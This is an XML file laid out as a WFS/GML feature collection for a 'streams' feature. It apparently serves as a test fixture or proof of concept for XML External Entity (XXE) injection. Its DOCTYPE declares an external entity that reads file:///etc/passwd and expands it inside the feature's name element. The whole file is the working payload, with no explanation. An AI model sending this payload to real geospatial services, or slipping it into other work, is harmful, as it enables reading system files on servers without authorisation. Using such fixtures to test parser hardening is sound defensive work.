<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE wfs:FeatureCollection [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<wfs:FeatureCollection
    xmlns:wfs="http://www.opengis.net/wfs"
    xmlns:gml="http://www.opengis.net/gml"
    xmlns:topp="http://www.openplans.org/topp">
  <gml:featureMember>
    <topp:streams fid="streams.1">
      <topp:the_geom>
        <gml:LineString srsName="EPSG:4326">
          <gml:coordinates>0,0 1,1</gml:coordinates>
        </gml:LineString>
      </topp:the_geom>
      <topp:name>&xxe;</topp:name>
    </topp:streams>
  </gml:featureMember>
</wfs:FeatureCollection>
